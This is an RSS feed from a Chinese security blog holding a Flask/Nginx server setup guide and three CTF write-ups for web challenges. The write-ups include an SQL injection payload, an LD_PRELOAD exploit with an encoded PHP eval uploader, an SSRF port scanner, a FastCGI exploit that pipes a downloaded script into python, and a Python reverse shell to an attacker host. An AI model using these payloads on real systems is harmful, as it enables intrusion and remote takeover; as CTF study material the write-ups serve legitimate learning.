<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
<channel>
<title><![CDATA[Virink's Blog]]></title>
<description><![CDATA[virink audit php python docker hacker bug exp vuls]]></description>
<link>http://www.virzz.com/</link>
<author>
<name><![CDATA[Virink]]></name>
<email><![CDATA[virink@outlook.com]]></email>
</author>
<language>zh-CN</language>
<copyright><![CDATA[© 2016-2017 ❤ Virink | All rights reserved.]]></copyright>
<atom:link href="http://www.virzz.com/rss.xml" rel="self" type="application/rss+xml" />
<item>
<title><![CDATA[如何折腾我的个人博客]]></title>
<pubDate>Wed, 14 Sep 2016 20:54:01 GMT</pubDate>
<link>http://www.virzz.com/2016_09_14_how_to_make_my_blog</link>
<guid>http://www.virzz.com/2016_09_14_how_to_make_my_blog</guid>
<description><![CDATA[<h1>如何折腾我的个人博客</h1>
<hr />
<p>简单总结一下我的博客是如何折腾的</p>
<p><strong>本博客程序及环境</strong>：Nginx + MySQL + Flask + uWSGI + Supervisor + SSL</p>
<h2>Python 環境</h2>
<h3>Python2.7</h3>
<p>我反正是習慣用這個版本</p>
<pre><code>sudo apt-get install python-dev build-essential
</code></pre>
<h3>PIP</h3>
<p>Python插件安裝管理工具</p>
<p>安裝</p>
<pre><code>sudo apt-get install python-pip
</code></pre>
<p>更新</p>
<pre><code>sudo pip install --upgrade pip
</code></pre>
<h3>Virtualenv</h3>
<p>Python依賴虛擬環境</p>
<p>安裝</p>
<pre><code>sudo pip install --upgrade virtualenv
</code></pre>
<h3>配置環境</h3>
<p>可以本地調試或者綫上部署都可以配置一個依賴虛擬環境，防止依賴混亂</p>
<p>新建 網站程序 目錄</p>
<pre><code>mkdir web-flask
cd web-flask
</code></pre>
<p>生成 虛擬環境 目錄</p>
<pre><code>virtualenv venv
</code></pre>
<p>使用当前命令行状态进入虚拟环境</p>
<pre><code>source venv/bin/activate
</code></pre>
<p>通過清单文件【requirements.txt】一次性安装Flask和他的相关依赖</p>
<pre><code>pip install -r requirements.txt
</code></pre>
<h2>Flask</h2>
<p>一套基於Python的web框架，至於怎麼玩，Baidu or Google！</p>
<p>我是通過研究 <a href="https://github.com/isislab/CTFd" title="CTFd">https://github.com/isislab/CTFd</a> 源碼來學習的</p>
<p>主要分四個達模塊</p>
<ul>
<li>utils -- 公共函數集合</li>
<li>models -- 數據庫模型</li>
<li>admin -- 後臺</li>
<li>view -- 前臺</li>
</ul>
<p>然後是兩個靜態文件夾</p>
<ul>
<li>templates -- 模板html</li>
<li>static - css、js、img等</li>
</ul>
<p>最後是</p>
<ul>
<li>__init__ -- 這個不知道怎麼翻譯（意會吧）</li>
<li>config -- 配置</li>
<li>manage -- 本地測試啟動入口</li>
</ul>
<p>關於 Flask 可以去看文檔，或者我以後有空再說</p>
<h2>MySQL</h2>
<p>也就那麼回事</p>
<pre><code>sudo apt-get install mysql-server mysql-client
</code></pre>
<p>不同環境不同命令、自己看著辦</p>
<h2>uWSGI</h2>
<p>实现了WSGI协议一個web服務器。</p>
<h3>安裝</h3>
<pre><code>pip install uwsgi
</code></pre>
<h3>配置文件 uwsgi.ini</h3>
<pre><code>[uwsgi]
# 任意未使用的端口，也可以是文件模式
socket = 127.0.0.1:9000
# 主進程模式開啟
master = true
# 網站程序根目錄
chdir = /home/virink/flask-web 
# 模塊 manage.py
module = manage 
# 應用變量
callable = app 
# 進程數
processes = 4 
# 線程數
threads = 2 
#stats = 127.0.0.1:9191 # 狀態顯示？大概是
daemonize = /home/virink/flask-web/logs/uwsgi.log # 日誌
</code></pre>
<h3>Flask啟動文件例子manage.py</h3>
<pre><code>#!/usr/bin/env python
from ICore import create_app
app = create_app()
# 一下可有可無
if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=8000)
</code></pre>
<h2>Supervisor</h2>
<h3>安裝</h3>
<pre><code>sudo apt-get install supervisor
</code></pre>
<h3>配置文件</h3>
<p>Supervisor 的全局的配置文件位置在 <code>/etc/supervisor/supervisor.conf</code></p>
<p>我們可以在 <code>/etc/supervisor/conf.d/</code> 添加一個新的 <code>*.conf</code> 文件</p>
<pre><code>[program:flask-web]
# 启动命令入口
command=/home/virink/flask-web/venv/bin/uwsgi /home/virink/flask-web/config.ini
# 命令程序所在目录
directory=/home/virink/flask-web
#运行命令的用户名
user=web-data
# 自動啟動
autostart=true
# 自動重啟
autorestart=true
#日志地址
stdout_logfile=/home/virink/flask-web/logs/uwsgi_supervisor.log
</code></pre>
<h3>操作</h3>
<pre><code>// 启动服务
sudo service supervisor start
// 终止服务
sudo service supervisor stop
</code></pre>
<p>停止服務之後 <strong>uwsgi</strong> 是不會關閉的，所以要更新flask的時候要 <code>kill</code> 了所有的 <strong>uwsgi</strong> 進程</p>
<p>我寫了個腳本</p>
<p><strong>restart.sh</strong></p>
<pre><code>#!/bin/bash
service supervisor stop &amp;&amp; kill -9 $(ps -e|grep uwsgi |awk '{print $1}') &amp;&amp; service supervisor start
</code></pre>
<p>運行腳本就好了</p>
<pre><code>chmod +x restart.sh
sudo ./restart.sh
</code></pre>
<h2>Nginx</h2>
<h3>安裝</h3>
<pre><code>sudo apt-get install nginx
</code></pre>
<h3>配置</h3>
<p>不要去改动默认的 <code>nginx.conf</code></p>
<p>而是修改配置文件 <code>/etc/nginx/sites-available/default</code></p>
<pre><code>server {
    listen  80;
    server_name domain; #公网地址

    location / {
        include      uwsgi_params;
        # 指向uwsgi 所应用的内部地址,所有请求将转发给uwsgi 处理
        uwsgi_pass   127.0.0.1:9000;  
        uwsgi_param UWSGI_PYHOME /home/virink/flask-web/venv; # 指向虚拟环境目录
        uwsgi_param UWSGI_CHDIR  /home/virink/flask-web; # 指向网站根目录
        uwsgi_param UWSGI_SCRIPT manage:app; # 指定启动程序
    }
}
</code></pre>
<p>然後重啟 <code>sudo service nginx restart</code></p>
<h3>提醒</h3>
<p>如果不是改動<strong>default</strong>而是添加一個新的配置文件<strong>xxx</strong></p>
<p>需要把該文件鏈接到 <strong>sites-enabled</strong> 文件夾</p>
<p>創建文件<code>/etc/nginx/sites-enabled/xxx</code>鏈接到<code>/etc/nginx/sites-available/xxx</code></p>
<pre><code>ln -s /etc/nginx/sites-enabled/xxx /etc/nginx/sites-available/xxx
</code></pre>
<p>到這裡就基本折騰好了</p>
<h2>SSL</h2>
<p>最近聽說 基於<strong>SSL</strong>的<strong>https</strong>比較流行，所以....</p>
<h3>安装 &amp; 生成Let's Encrypt证书</h3>
<p><strong>运行时保證80端口可以访问以及拥有root权限</strong></p>
<pre><code>apt-get update
apt-get -y install git
git clone https://github.com/letsencrypt/letsencrypt
cd letsencrypt
sudo ./letsencrypt-auto certonly --standalone -d yourdomain.com -d www.yourdomain.com

or

sudo apt-get install letsencrypt 
letsencrypt certonly --standalone -d yourdomain.com -d www.yourdomain.com
</code></pre>
<p>输入邮箱，</p>
<p>Agree Let's Encrypt的TOS，</p>
<p>证书成功，存放位置为 <code>/etc/letsencrypt/live/yourdomain.com/fullchain.pem</code></p>
<h3>配置Nginx</h3>
<p>修改 <code>listen 80;</code> 为 <code>listen 443 ssl;</code></p>
<p>然后添加</p>
<pre><code>ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_prefer_server_ciphers on;
ssl_ciphers AES256+EECDH:AES256+EDH:!aNULL;
</code></pre>
<p>在 <code>location /</code> 中添加 <code>uwsgi_param UWSGI_SCHEME https;</code></p>
<h3>配置 Let's Encrypt 自动续期</h3>
<p>确保<code>/etc/letsencrypt/renewal/yourdomain.com.conf</code>文件的几个重要参数正常</p>
<pre><code>email = youremail@xxx.com
tos = True
</code></pre>
<p><strong>接下來的我还不会、、、Orz, 大概是利用 crontab</strong></p>
<pre><code>sudo crontab -u root -e
* * * */1 * /usr/sbin/service nginx stop;/usr/bin/letsencrypt renew;/usr/sbin/service nginx start
</code></pre>
<h3>强制使用https访问 或者 換域名</h3>
<p>因為大多數人是不會輸入<strong>https://www.virzz.com</strong>而是輸入<strong>http://www.virzz.com</strong></p>
<p>所以有必要開一個80端口進行<strong>rewrite</strong>重定向，</p>
<p>另外，換域名和換目錄也可以用<strong>rewrite</strong>重定向，</p>
<p>我上一個 <strong>Blog</strong> 用的是 <strong>Typecho</strong> ，文章訪問格式是 <strong>www.old.com/分類/文章</strong>，</p>
<p>而我新的 <strong>Blog</strong> 是 <strong>www.yourdomain.com/文章</strong></p>
<p><strong>flask_nginx</strong></p>
<pre><code>server {  
    listen  80;
    listen 443 ssl;
    server_name www.yourdomain.com;
    server_name www.old.com;
    charset     utf-8;

    # 如果不是 **www.yourdomain.com** 則跳轉到 **https://www.yourdomain.com**
    if ($host != 'www.yourdomain.com' ) {
        rewrite ^/(\w+)/(.*)$ https://www.yourdomain.com/$2 permanent;
        # ^/(\w+)/(.*)$ 匹配 目錄/文章， 取文章
        # permanent 指 301 永久重定向
    }

    # 如果不是 **https** 則跳轉到 **https://www.yourdomain.com**
    if ($scheme != 'https' ) {
        rewrite ^/(.*)$ https://www.yourdomain.com/$1 permanent;
    }

    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    ssl_prefer_server_ciphers on;
    ssl_ciphers AES256+EECDH:AES256+EDH:!aNULL;

    access_log /home/virink/virzz/logs/access_log;
    error_log  /home/virink/virzz/logs/error_log;

    uwsgi_connect_timeout 300;

    location / {
        include      uwsgi_params;
        uwsgi_param UWSGI_SCHEME https; # 使用HTTPS模式
        uwsgi_pass   127.0.0.1:9000;  
        uwsgi_param UWSGI_PYHOME /home/virink/flask-web/venv;
        uwsgi_param UWSGI_CHDIR  /home/virink/flask-web;
        uwsgi_param UWSGI_SCRIPT manage:app;
    }
}
</code></pre>
<p>搞定、收功、、不成功的話、一起交流、、</p>
<p>因為我現在的方式是兩個不同的配置文件</p>
<p><strong>https_flask_web</strong></p>
<pre><code>server {
    listen  443 ssl;
    server_name www.yourdomain.com;
    charset     utf-8;

    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
    ssl_prefer_server_ciphers on;
    ssl_ciphers AES256+EECDH:AES256+EDH:!aNULL;

    access_log /home/virink/virzz/logs/access_log;
    error_log  /home/virink/virzz/logs/error_log;

    uwsgi_connect_timeout 300;

    location / {
        include      uwsgi_params;
        uwsgi_param UWSGI_SCHEME https;
        uwsgi_pass   127.0.0.1:9000;  
        uwsgi_param UWSGI_PYHOME /home/virink/flask_web/venv;
        uwsgi_param UWSGI_CHDIR  /home/virink/flask_web;
        uwsgi_param UWSGI_SCRIPT manage:app;
    }
}
</code></pre>
<p><strong>http_flask_web</strong></p>
<pre><code>server {
    listen  80;
    server_name www.yourdomain.com;
    server_name www.old.com;

    if ($host != 'www.yourdomain.com' ) {
        rewrite ^/(\w+)/(.*)$ https://www.yourdomain.com/$2 permanent;
    }
    if ($scheme != 'https' ) {
        rewrite ^/(.*)$ https://www.yourdomain.com/$1 permanent;
    }

    charset     utf-8;

    location / {
        root /var/www/;
    }

    error_page 404 https://www.virzz.com;
}
</code></pre>
<h2>結束語</h2>
<h3>關於本文</h3>
<p>折騰這個blog画的時間蠻久的，不過總算弄出來了。</p>
<p>期間不知道 百度、Google了多少回，各種文章的方法反復測試。</p>
<p>為了然其他像我這樣不得門而入的童鞋不走冤枉路，特此寫了篇文章。</p>
<h3>為何用Flask</h3>
<p>至於為什麼不用PHP是因為我想裝個逼~~PHP的MVC不好玩，也不會用框架，各種麻煩</p>
<p>Python開發挺好玩的吧、我加了幾個不錯的插件~~</p>
<p>發文章的同時、可以同步發微博和推特、並且實時推送文章鏈接送到Baidu【百度站長-鏈接提交】</p>
<h3>關於開源</h3>
<p>最後、暫時還不打算開源、比較開發基礎不太好、代碼淩亂沉余、真心不好意思開源污染大夥的眼睛。</p>
<h3>關於前端</h3>
<p>前端實在是渣渣到了極點、本網站的前端是從GitBook上面拔下來的，JS都是用JQ自己寫的。勉強能用~~</p>
<p>急求前端大牛和Py大牛一起完善，弄好之後會開源的。</p>
<h3>真的結束了</h3>
<p>Over</p>]]></description>
</item>
<item>
<title><![CDATA[VirzzBlog 開源通知]]></title>
<pubDate>Mon, 12 Sep 2016 15:20:48 GMT</pubDate>
<link>http://www.virzz.com/2016_09_12_VirzzBlog_open_source</link>
<guid>http://www.virzz.com/2016_09_12_VirzzBlog_open_source</guid>
<description><![CDATA[<h1>VirzzBlog 開源通知</h1>
<p>GitHub : <a href="https://github.com/virink/VirzzBlog" title="如何折騰我的個人博客">https://github.com/virink/VirzzBlog</a></p>
<h2>前言</h2>
<p>應一些朋友的要求，我就把博客的源碼開源了。基本上和我生產環境是一樣的。</p>
<p>希望大家多多完善，也可以對我博客進行測試，但是希望不要破壞，畢竟修復也很麻煩。</p>
<h2>安裝配置</h2>
<p>懶得貼過來了，順便提高一下訪問量，詳情請見：<a href="https://www.virzz.com/" title="如何折騰我的個人博客">https://www.virzz.com/</a></p>
<h2>代碼問題</h2>
<p>由於本人初學Flask以及只懂Python基本腳本編寫，很多沉余代碼還沒有美化，單純的實現功能而不是盡善盡美的使代碼簡潔。</p>
<p>以後有時間的話，我會盡力完善的。</p>
<p>如果覺得代碼太Low，希望可以得到你的指點和patch~</p>
<p>隨意吐槽~~</p>
<p>看不上的話，請出門左拐。或者點擊右上角的<strong>X</strong>。</p>
<h2>未解決問題</h2>
<h4>postPlugin()</h4>
<p>更新文章推送不成功，具體原因我還沒看，這幾天有點忙</p>
<h4>前端問題</h4>
<ul>
<li>未實現移動設備的觸摸操作</li>
<li>UC瀏覽器無法處理菜單欄與正文的移動</li>
</ul>
<h4>訪問量問題</h4>
<p>單純的跟蹤打開頁面，沒有過濾搜索引擎爬蟲的因素</p>
<h4>友鏈排名</h4>
<p>一樣是單純的打開，點擊數+1，無保護措施</p>
<h4>其它</h4>
<p>我也不知道還有多少漏洞存在、、Orz</p>]]></description>
</item>
<item>
<title><![CDATA[三個白帽-[￥-1]招聘又开始了，你怕了吗？ Writeup]]></title>
<pubDate>Thu, 08 Sep 2016 16:01:30 GMT</pubDate>
<link>http://www.virzz.com/2016_09_08_three_white_hat_1_hiring_again_are_you_afraid_of_writeup</link>
<guid>http://www.virzz.com/2016_09_08_three_white_hat_1_hiring_again_are_you_afraid_of_writeup</guid>
<description><![CDATA[<h1>三個白帽-[￥-1]招聘又开始了，你怕了吗？ Writeup</h1>
<h2>挑战介绍</h2>
<p>审计题，源码在/www.zip下，有waf，就是这么自信。什么，这个网站你见过？那我也不怕，网站升级了！</p>
<h2>第一個坑 密码怎么会告诉你</h2>
<p>進入後臺是通過cookie認證，表示默默地遇到了火日大大的坑。</p>
<p><strong>encrypt.php</strong></p>
<pre><code>$pass="密码怎么会告诉你";
</code></pre>
<p>事實上，這就是真正的密鑰。</p>
<pre><code>echo encrypt("admin")
</code></pre>
<p>生成的字符串寫入cookie，就繞過了。</p>
<pre><code>username=AH0HDvW_h0kclJrjHQmjxs8qiHJEU2UqBJ7NGfQhtxI
</code></pre>
<h2>第二個坑 SQL注入</h2>
<p>漏洞來源：</p>
<blockquote>
<p>http://www.wooyun.org/bugs/wooyun-2010-064792<br />
http://www.wooyun.org/bugs/wooyun-2010-0171945</p>
</blockquote>
<p><strong>waf.php</strong></p>
<pre><code>$uri = explode("?",$_SERVER['REQUEST_URI']);
if(isset($uri[1])) {
    $parameter = explode("&amp;",$uri[1]);
    foreach ($parameter as $k =&gt; $v) {
        $v1 = explode("=",$v);
        if (isset($v1[1])) {
            $_REQUEST[$v1[0]] = stripStr($v1[1]);
        }
    }
}
</code></pre>
<p><strong>/admin/waf.php</strong></p>
<pre><code>$sql="select * from user where id=".$_REQUEST["id"].";";
</code></pre>
<p><strong>/admin/memo.php</strong></p>
<p>注釋了備忘錄，所以要注入，讀取備忘錄信息。</p>
<p>構造Payload：</p>
<pre><code>/admin/user.php?id=-1/**/union/**/select/**/1,1,1,content,1/**/from/**/memo/**/limit/**/0,1&amp; id=1
</code></pre>
<p>得到信息</p>
<pre><code>/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php
password:firesun
</code></pre>
<h2>第三個坑 putenv LD_PRELOAD</h2>
<p>這個和alictf差不多、直接給出payload！</p>
<p><strong>v.c</strong></p>
<pre><code>#include&lt;stdlib.h&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
#include&lt;dirent.h&gt;

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    ///flag_gei_ni_ni_Ye_du_bu_LIAO
    FILE *fp1, *fp2;
    fp1 = fopen("/tmp/virink", "w");
    //dir
    char buf[100];
    DIR *dirp;
    struct dirent *dp;
    dirp = opendir("/");
    while ((dp = readdir(dirp)) != NULL) {
        fputs(dp-&gt;d_name, fp1);
    }
    closedir(dirp);
    //flag
    fp2 = fopen("/flag_gei_ni_ni_Ye_du_bu_LIAO", "r");
    fgets(buf, 100, fp2);
    fputs(buf, fp1);
    fclose(fp1);
    fclose(fp2);
}

分別生成讀目錄，讀文件兩個so。
</code></pre>
<p><strong>exp.php</strong></p>
<pre><code>&lt;form action="http://451bf8ea3268360ee.jie.sangebaimao.com/NQTGmhlG3im8PUcsO2GgMCieThLtbqi4.php"  method="post" enctype="multipart/form-data"&gt;
&lt;input type="text" name="firesun" id="v" value="eval(base64_decode('aWYoaXNzZXQoJF9GSUxFU1sndiddKSkgew0KCXByaW50X3IoJF9GSUxFUyk7DQoJbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ3YnXVsndG1wX25hbWUnXSwgIi90bXAvIi4kX0ZJTEVTWyd2J11bJ25hbWUnXSk7DQoJdmFyX2R1bXAoZmlsZV9leGlzdHMoIi90bXAvIi4kX0ZJTEVTWyd2J11bJ25hbWUnXSkpOw0KCXB1dGVudigiTERfUFJFTE9BRD0vdG1wLyIuJF9GSUxFU1sndiddWyduYW1lJ10pOw0KCXZhcl9kdW1wKG1haWwoImFAbG9jYWxob3N0IiwiIiwiIiwiIiwiIikpOw0KCWVjaG8gZ2V0ZW52KCJMRF9QUkVMT0FEIik7DQoJc2hvd19zb3VyY2UoIi90bXAvdmlyaW5rIik7DQp9'));"/&gt;
&lt;input type="file" name="v" id="v" /&gt;
&lt;input type="submit" name="submit" value="Submit" /&gt;
&lt;/form&gt;
</code></pre>
<p>通過exp.php分別上傳兩個so就OK了。</p>
<p>關於讀取文件，用<strong>show_source</strong></p>
<h3>flag:miao{5U5QqpSG6b8XcW7JmXLLzMQj1mKTT7XO}</h3>]]></description>
</item>
<item>
<title><![CDATA[三个白帽-寻找来自星星的你-第一期]]></title>
<pubDate>Tue, 07 Jun 2016 00:56:21 GMT</pubDate>
<link>http://www.virzz.com/2016_06_07_sangebaimao_you_come_from_start_1_write</link>
<guid>http://www.virzz.com/2016_06_07_sangebaimao_you_come_from_start_1_write</guid>
<description><![CDATA[<h1>三個白帽-寻找来自星星的你 - 第一期</h1>
<h2>挑战介绍</h2>
<p>来自星星的你被我给丢了，我可能需要用我所有的一切才能把你找回，编了两句就编不下去了，好吧，我承认这是一期渗透题，就是这么直接。</p>
<h2>挑战目标</h2>
<p>http://0761e975dda0c67cb.jie.sangebaimao.com/</p>
<h2>0x01 信息收集</h2>
<p>打開地址，是一個dz論壇。似乎不怎麼好玩啊，還是最新版本的。</p>
<p>既然是滲透了，感覺祭出大殺器“掃描目錄”！<strong>（字典才是關鍵）</strong></p>
<p>很快就get到關鍵信息了（排除dz原有的目錄及頁面）</p>
<pre><code>/info.php
/uddiexplorer/
</code></pre>
<p>一個是phpinfo()信息，很有用處的。</p>
<pre><code>/opt/discuz/info.php
</code></pre>
<p>另一個是weblogic的東西。</p>
<p>果斷百度<strong>"uddiexplorer 漏洞"</strong>，馬上可以知道<strong>weblogic uddiexplorer</strong>存在<strong>SSRF</strong>漏洞。</p>
<p>這次滲透的關鍵就在於<strong>SSRF</strong>！！！</p>
<h2>利用漏洞</h2>
<p>SSRF並不只是搞內網，結合三個白帽的結界docker，搞127.0.0.1才是王道！</p>
<p>萬能的百度啊，搜索關鍵字<strong>"SearchPublicRegistries ssrf 漏洞 exp"</strong></p>
<p>得到<strong>http://www.tuicool.com/articles/UjaqIbz</strong></p>
<p>得到一個腳本，自己修改一下拿來用！！！</p>
<p><strong>端口掃描.py</strong></p>
<pre><code>#!/usr/bin/env python  
# -*- coding: utf-8 -*-

import re
import requests

def scan(ip_str):
    url = 'http://0761e975dda0c67cb.jie.sangebaimao.com'
    ports = ('21','22','23','53','80','1080','1433','1521','3306','3389','4899','8080','7001','8000','9000','9001',)
    for port in ports:
        exp_url = url+"/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"%(ip_str, port)
        try:
            response = requests.get(exp_url, timeout=15, verify=False)
            re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
            re_sult2 = re.findall('but could not connect',response.content)
            if len(re_sult1)!=0 and len(re_sult2)==0:
                print ip_str+':'+port
        except Exception, e:
            pass

if __name__ == "__main__":
    scan('127.0.0.1')
</code></pre>
<p>成功破出22，80，3306，7001，9000等端口。</p>
<p>SSRF+GOPHER一直都很牛逼，最近更是火熱。</p>
<p>還是百度~~</p>
<p>rr菊苣最新文章<a href="http://drops.wooyun.org/tips/16357">《Do Evil Things with gopher://》</a></p>
<blockquote>
<p>0x03 攻击 FastCGI<br />
一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。<br />
0x06 参考<br />
<a href="http://zone.wooyun.org/content/1060">PHP FastCGI 的远程利用</a></p>
</blockquote>
<h2>命令執行</h2>
<p>下載fcgi_exp</p>
<p>運行</p>
<pre><code>nc -l -p 9000 &gt;x.txt &amp; go run fcgi_exp.go system 127.0.0.1 9000 /opt/discuz/info.php "curl YOURIP/shell.py|python"

php -f gopher.php
</code></pre>
<p>把payload保存到x.txt</p>
<p><strong>反彈shell的黑科技，bash反彈無效~~</strong></p>
<p>然後urlencode編碼payload生成ssrf.php</p>
<p><strong>shell.py</strong></p>
<pre><code>import socket,subprocess,os  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("yourip",9999))  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
p=subprocess.call(["/bin/bash","-i"]);
</code></pre>
<p><strong>gopher.php</strong></p>
<pre><code>&lt;?php
$p = str_replace("+", "%20", urlencode(file_get_contents("x.txt")));
file_put_contents("ssrf.php", "&lt;?php header('Location: gopher://127.0.0.1:9000/_".$p."');?&gt;");
?&gt;
</code></pre>
<p>成功生成了利用文件ssrf.php</p>
<h2>反彈shell</h2>
<p>VPS運行</p>
<pre><code>nc -lvv 9999
</code></pre>
<p>利用SSRF</p>
<pre><code>http://0761e975dda0c67cb.jie.sangebaimao.com/uddiexplorer/SearchPublicRegistries.jsp?&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business%20location&amp;btnSubmit=Search&amp;operator=YOURIP/ssrf.php
</code></pre>
<p>成功反彈~~~</p>
<h2>GETFLAG</h2>
<p>自己找吧</p>]]></description>
</item>
<item>
<title><![CDATA[三個白帽-条条大路通罗马系II-Writeup]]></title>
<pubDate>Fri, 03 Jun 2016 22:12:53 GMT</pubDate>
<link>http://www.virzz.com/2016_06_03_sangebaimao_all_roads_lead_to_rome_series_2_writeup</link>
<guid>http://www.virzz.com/2016_06_03_sangebaimao_all_roads_lead_to_rome_series_2_writeup</guid>
<description><![CDATA[<h1>三個白帽-条条大路通罗马系列2</h1>
<h2>0x00 前言</h2>
<p>好好的Web咋變成了misc？友谊小船，說翻就翻！！！！</p>
<p>http://4e79618700b44607c.jie.sangebaimao.com</p>
<h2>0x01 獲取源碼</h2>
<p>沒有Tips的代碼審計題，源碼獲取必定是第一關。右鍵看源碼，沒東西，看看header頭，果然有蹊蹺。</p>
<pre><code>Set-Cookie source=WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr
</code></pre>
<p>於是乎，解得</p>
<pre><code>substr(md5($_GET['source']),3,6)=="81a427"
</code></pre>
<p>這個好熟悉的趕腳，在BCTF2016的homework出現過，雖然有點不同。立馬祭出神器</p>
<pre><code>#!/bin/env python
#-*- encoding: utf-8 -*-

import md5

def mx(str):
    m1 = md5.new()   
    m1.update(str)   
    return m1.hexdigest()

if __name__ == '__main__':
    m = '81a427'
    for x in range(1,100000000):
        a = mx(str(x))[3:9]
        if a == m:
            print x
            break
</code></pre>
<p>跑出<code>47733</code></p>
<pre><code>/index.php?source=47733
</code></pre>
<p>即可得到源碼包的下載地址<code>/WoShiYuanMa_SGBM.zip</code></p>
<h2>0x02 登陸的腦洞</h2>
<pre><code>$password = unserialize($_POST['password']);
if($_POST['username']='admin' &amp;&amp; $password['username'] !== 'admin' &amp;&amp; $password['password'] !== 'admin'){
    if ($password['username'] == 'admin' &amp;&amp; $password['password']=='admin') {
        $_SESSION['login'] = 1;
        echo "&lt;center style=\"font-size:36px;\"&gt;&lt;a href=\"main.php\"&gt;Click jump to the Backstage&lt;/a&gt;&lt;/center&gt;";
    }
</code></pre>
<p>一開始以為是<strong>unserialize</strong>的腦洞，仔細看看代碼才發現是php的特性雙等號（==）的弱類型轉換漏洞。</p>
<pre><code>(0 == "str")=&gt;true
(0 === "str")=&gt;false
</code></pre>
<p>即構造<strong>POST</strong>：</p>
<pre><code>username=admin&amp;password=a:2:{s:8:"username";i:0;s:8:"password";i:0;}&amp;submit=1
</code></pre>
<p>成功擼過~</p>
<h2>0x03 二次驗證</h2>
<pre><code>if (isset($_POST['salt']))
{
    if (ereg("^[a-zA-Z0-9]+$", $_POST['salt']) === FALSE)
    {
        exit('ereg');
    }
    elseif (strlen($_POST['salt']) &lt; 11 &amp;&amp; $_POST['salt'] &gt; 999999999)
    {
        if (strpos($_POST['salt'], '*SGBM*') !== FALSE)
        {
            $_SESSION['admin'] = 1;
            echo "&lt;center style=\"font-size:36px;\"&gt;&lt;a href=\"./admin/index.php\"&gt;Click jump to the Backstage&lt;/a&gt;&lt;/center&gt;";
        }
</code></pre>
<p>咋一看、好像很難的樣子。</p>
<p><strong>ereg</strong>處理數組會得到<strong>NULL</strong>,</p>
<p>同樣<strong>strlen</strong>處理數組也會得到<strong>NULL</strong>,</p>
<p><strong>array() &gt; int</strong>可以得到<strong>true</strong>,</p>
<p><strong>strpos</strong>處理數組也會得到<strong>NULL</strong>。</p>
<p>即構造<strong>POST</strong>：</p>
<pre><code>salt[]=v&amp;submit=1
</code></pre>
<p>再次完美擼過。</p>
<h2>0x04 PATHINFO模式</h2>
<pre><code>$URL = $_SERVER['REQUEST_URI'];
$matches = array();
preg_match('/^([a-z\/.]+)$/', $URL, $matches); 
if(strpos($URL, './') !== FALSE){
    exit('./');
}
else if(strpos($URL, '\\') !== FALSE){
    exit('\\');
}
else if(empty($matches) || $matches[1] != $URL){
    exit('empty($matches) || $matches[1] != $URL');
} 
else if(strpos($URL, '//') !== FALSE){
    exit('//');
} 
else if(substr($URL, -10) !== '/index.php'){
    exit('substr($URL, -10) !== \'/index.php\'');
} 
else if(strpos($URL, 'p.') !== FALSE){
    exit('p.');
} 
else if($URL == '/admin/index.php'){
    exit('$URL == \'/admin/index.php\'');
}
else {
    if($URL !== '/admin/index.php'){
        $_SESSION['power'] = 1;
        exit("&lt;center style=\"font-size:36px;\"&gt;&lt;a href=\"upload.php\"&gt;Click jump to the Backstage&lt;/a&gt;&lt;/center&gt;");
    }
}
</code></pre>
<p>一開始各種繞過，始終無解，後來得到大神的Tips。</p>
<p>還是缺乏經驗啊~</p>
<p>LN牛的提示：</p>
<blockquote>
<p>索题小二(516421987) 2016-05-20 1:12:49<br />
多点框架经验应该能猜到</p>
</blockquote>
<p>果斷百度到<strong>PATHINFO模式</strong></p>
<p>URL:<code>/admin/index.php/admin/index.php</code></p>
<p>成功擼過~</p>
<h2>0x05 上傳之fuzz後綴</h2>
<pre><code>if($_FILES["file"]['size'] &gt; 0 &amp;&amp; $_FILES["file"]['size'] &lt; 102400) {
    $typeAccepted = ["image/jpeg", "image/gif", "image/png"];
    $blackext = ["php", "php3", "php4", "php5", "pht", "phtml", "phps"];//总有一款适合你
    $filearr = pathinfo($_FILES["file"]["name"]);
    if(!in_array($_FILES["file"]['type'], $typeAccepted)) {
        exit("type error");
    }
    if(in_array($filearr["extension"], $blackext)) {
        exit("extension error");
    }
    $filename = md5(time().rand(10, 99)) . "." . $filearr["extension"];
    $destination_folder = '../uploads/';
    $destination_folder .= date('Y', time()) . "/" . date('m', time()) . "/";
    $file_name_path = $destination_folder.$filename;
    if (!file_exists($destination_folder)) mkdir('./' . $destination_folder, 0777, true);
    if (move_uploaded_file($_FILES["file"]['tmp_name'], $file_name_path)) {
        exit('upload success!');
    } else {
        exit('upload false!');
    }
}
</code></pre>
<p>逆天的黑名單：<strong>$blackext = ["php", "php3", "php4", "php5", "pht", "phtml", "phps"];</strong></p>
<p>噁心的文件名<strong>$filename = md5(time().rand(10, 99)) . "." . $filearr["extension"];</strong></p>
